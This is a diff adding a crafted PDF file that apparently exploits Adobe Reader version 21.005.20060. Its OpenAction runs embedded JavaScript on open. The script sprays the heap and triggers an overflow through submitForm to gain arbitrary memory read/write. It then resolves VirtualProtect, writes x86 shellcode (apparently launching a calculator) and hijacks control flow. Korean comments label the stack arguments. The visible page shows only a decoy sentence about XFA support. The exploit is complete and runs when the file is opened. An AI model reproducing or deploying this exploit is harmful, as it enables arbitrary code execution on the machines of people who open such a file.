@@ -1,0 +1,272 @@
+%PDF-1.7
+1 0 obj
+<<
+  /Type /Catalog
+  /Pages 2 0 R
+  /AcroForm 6 0 R
+  /OpenAction 9 0 R
+  /URI 11 0 R
+  /NeedsRendering true
+>>endobj
+2 0 obj
+<<    
+  /Type /Pages    
+  /Kids [3 0 R]    
+  /Count 1
+>>endobj
+3 0 obj
+<<    
+  /Type /Page    
+  /Parent 2 0 R    
+  /Contents 4 0 R    
+  /MediaBox [0 0 612 792]
+  /Annots [ 12 0 R ]
+  /Resources    
+  <<
+    /Font <</F1 5 0 R>>
+	/ProcSet [/PDF /Text]    
+  >>    
+  /Annots [8 0 R]
+>>
+endobj
+4 0 obj
+<</Length 94>>
+stream
+BT
+/F1 24 Tf
+100 600 Td(Your PDF reader does not support XFA if you see this sentence.) Tj
+ET
+endstream
+endobj
+5 0 obj
+<<
+  /Type /Font    
+  /Subtype /Type1    
+  /Name /F1    
+  /BaseFont 
+  /Helvetica    
+  /Encoding 
+  /MacRomanEncoding
+>>endobj
+6 0 obj
+<<    
+  /Fields [7 0 R]
+  /XFA 8 0 R
+>>
+endobj
+7 0 obj
+<<
+  /Type /Annot    
+  /Subtype /Widget    
+  /FT /Tx    
+  /P 3 0 R    
+  /T (MyField1)    
+  /H /N    
+  /F 6    
+  /Ff 65536    
+  /DA (/F1 12 Tf 1 1 1 rg)    
+  /Rect [10 600 11 700]
+  /V (The quick brown fox ate the lazy mouse)
+>>
+endobj
+8 0 obj
+<</Length 1404>>
+stream
+<?xml version="1.0" encoding="UTF-8"?>
+<xdp:xdp xmlns:xdp="http://ns.adobe.com/xdp/">
+  <template xmlns="http://www.xfa.org/schema/xfa-template/2.1/">
+    <subform name="form1" layout="tb" locale="en_US">
+	  <pageSet>
+	    <pageArea name="Page1" id="Page1">
+		  <contentArea x="0.25in" y="0.25in" w="197.3mm" h="284.3mm"/>
+		</pageArea>
+	  </pageSet>
+      <subform>
+	    <draw name="Text" h="0.372417in" w="5.943625in">
+	      <ui>
+	        <textEdit>
+		      <margin/>
+		    </textEdit>
+	      </ui>
+	      <value>
+	        <text></text>
+	      </value>
+	      <font size="24pt" typeface="Myriad Pro" baselineShift="0pt"/>
+	    </draw>
+      </subform>
+	</subform>  
+  </template>
+  <config xmlns="http://www.xfa.org/schema/xci/1.0/">
+    <present>
+	  <destination>pdf</destination>
+	  <pdf>
+	    <interactive>1</interactive>
+	  </pdf>
+	</present>
+  </config>
+</xdp:xdp>
+endstream
+endobj
+9 0 obj
+<<
+  /Type /Action    
+  /S /JavaScript    
+  /JS 10 0 R
+>>endobj
+10 0 obj
+<</Length 48>>
+stream
+
+//target adobe reader version��21.005.20060
+console.show()
+
+function gc() {
+  new ArrayBuffer(3 * 1024 * 1024 * 100);
+}
+
+var strRelUrlSize = 0x600;
+var strConUrlSize = 0x800;
+
+function createArrayBuffer(blocksize) {
+  var arr = new ArrayBuffer(blocksize - 0x10);
+  var u8 = new Uint8Array(arr);
+  for (var i = 0; i < arr.byteLength; i++) {
+    u8[i] = 0x42;
+  }
+  return arr;
+}
+
+var arrB = new Array(0xE0);
+var sprayStr1 = unescape('%uFFFF%uFFFF%uFFFF%uFFFF%u0000') + unescape('%uFFFF').repeat((strRelUrlSize / 2) - 1 - 5);
+for (var i = 0; i < arrB.length; i++) {
+  arrB[i] = sprayStr1.substr(0, (strRelUrlSize / 2) - 1).toUpperCase();
+}
+
+for (var i = 0x11; i < arrB.length; i += 10) {
+  arrB[i] = null;
+  arrB[i] = undefined;
+}
+
+var arrA = new Array(0x130);
+for (var i = 0; i < arrA.length; i++) {
+  arrA[i] = createArrayBuffer(strConUrlSize);
+}
+
+for (var i = 0x11; i < arrA.length; i += 10) {
+  arrA[i] = null;
+  arrA[i] = undefined;
+}
+
+gc();
+
+try {
+    this.submitForm('a'.repeat(strRelUrlSize - 1));
+} catch (err) { }
+
+for (var i = 0; i < arrA.length; i++) {
+    if (arrA[i] != null && arrA[i].byteLength == 0xFFFF) {
+      var temp = new DataView(arrA[i]);
+      temp.setInt32(0x7F0 + 0x8 + 0x4, 0xFFFFFFFF, true);
+    }
+
+    if (arrA[i] != null && arrA[i].byteLength == -1) {
+      var rw = new DataView(arrA[i]);
+      break;
+    }
+}
+
+if (rw) {
+    curChunkBlockOffset = rw.getUint8(0xFFFFFFED, true);
+    BitMapBufOffset = curChunkBlockOffset * (strConUrlSize + 8) + 0x18
+
+    for (var i = 0; i < 0x30; i += 4) {
+        BitMapBufOffset += 4;
+        signature = rw.getUint32(0xFFFFFFFF + 1 - BitMapBufOffset, true);
+        if (signature == 0xF0E0D0C0) {
+            BitMapBufOffset -= 0xC;
+            BitMapBuf = rw.getUint32(0xFFFFFFFF + 1 - BitMapBufOffset, true);
+            break;
+        }
+    }
+
+    if (BitMapBuf) {
+        StartAddr = BitMapBuf + BitMapBufOffset - 4;
+
+        function readUint32(dataView, readAddr) {
+            var offsetAddr = readAddr - StartAddr;
+            if (offsetAddr < 0) {
+                offsetAddr = offsetAddr + 0xFFFFFFFF + 1;
+            }
+            return dataView.getUint32(offsetAddr, true);
+        }
+
+        function writeUint32(dataView, writeAddr, value) {
+            var offsetAddr = writeAddr - StartAddr;
+            if (offsetAddr < 0) {
+                offsetAddr = offsetAddr + 0xFFFFFFFF + 1;
+            }
+            return dataView.setUint32(offsetAddr, value, true);
+        }
+
+        var heapSegmentSize = 0x10000;
+        heapSpray = new Array(0x8000);
+        for (var i = 0; i < 0x8000; i++) {
+            heapSpray[i] = new ArrayBuffer(heapSegmentSize - 0x10 - 0x8);
+        }
+
+        EScriptModAddr = readUint32(rw, readUint32(rw, StartAddr - 8) + 0xC) - 0x277548;
+        VirtualProtectAddr = readUint32(rw, EScriptModAddr + 0x1B0060);
+        
+        var dataViewObjPtr = rw.getUint32(0xFFFFFFFF + 0x1 - 0x8, true);
+        var dvShape = readUint32(rw, dataViewObjPtr);
+        var dvShapeBase = readUint32(rw, dvShape);
+        var dvShapeBaseClasp = readUint32(rw, dvShapeBase);
+        
+        var offset = 0x1050AE;
+        writeUint32(rw, dvShapeBaseClasp + 0x10, EScriptModAddr + offset);
+
+        var shellcode = [0xec83e589, 0x64db3120, 0x8b305b8b, 0x5b8b0c5b, 0x8b1b8b1c, 0x08438b1b, 0x8bfc4589, 0xc3013c58, 0x01785b8b, 0x207b8bc3, 0x7d89c701, 0x244b8bf8, 0x4d89c101, 0x1c538bf4, 0x5589c201, 0x14538bf0, 0xebec5589, 0x8bc03132, 0x7d8bec55, 0x18758bf8, 0x8bfcc931, 0x7d03873c, 0xc18366fc, 0x74a6f308, 0xd0394005, 0x4d8be472, 0xf0558bf4, 0x41048b66, 0x0382048b, 0xbac3fc45, 0x63657878, 0x5208eac1, 0x6e695768, 0x18658945, 0xffffb8e8, 0x51c931ff, 0x78652e68, 0x61636865, 0xe389636c, 0xff535141, 0xb9c931d0, 0x73736501, 0x5108e9c1, 0x6f725068, 0x78456863, 0x65897469, 0xff87e818, 0xd231ffff, 0x00d0ff52];
+        var shellcodesize = shellcode.length * 4;
+
+        for (var i = 0; i < shellcode.length; i++) {
+            writeUint32(rw, StartAddr + 0x18 + i * 4, shellcode[i]);
+        }
+
+        var newStackAddr = 0x5D000001;
+        
+        writeUint32(rw, newStackAddr, VirtualProtectAddr);      // RIP 1
+        writeUint32(rw, newStackAddr + 0x4, StartAddr + 0x18);  // RIP 2
+        writeUint32(rw, newStackAddr + 0x8, StartAddr + 0x18);  //  Arg1 : 메모리 시작 주소
+        writeUint32(rw, newStackAddr + 0xC, shellcodesize);     //  Arg2 : 메모리 크기
+        writeUint32(rw, newStackAddr + 0x10, 0x40);             //  Arg3 : 메모리 보호 상수 : 0x40 : 실행 권한
+        writeUint32(rw, newStackAddr + 0x14, StartAddr + 0x14); //  Arg4 : 이전 보호 상수 저장할 포인터
+
+        app.alert("Before execute");
+        var foo = rw.execFlowHijack;
+    }
+}
+
+endstream
+endobj
+11 0 obj
+<<
+/Base <FEFF68747470733A2F2F7777772E61612E636F6D2F414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141412F>
+>>
+endobj
+xref
+0000000000 65535 f
+0000000010 00000 n
+0000000143 00000 n
+0000000219 00000 n
+0000000443 00000 n
+0000000588 00000 n
+0000000724 00000 n
+0000000781 00000 n
+0000001033 00000 n
+0000002491 00000 n
+0000002570 00000 n
+0000002600 00000 n
+trailer <</Root 1 0 R/Size 12>>
+startxref
+2670
+%%EOF
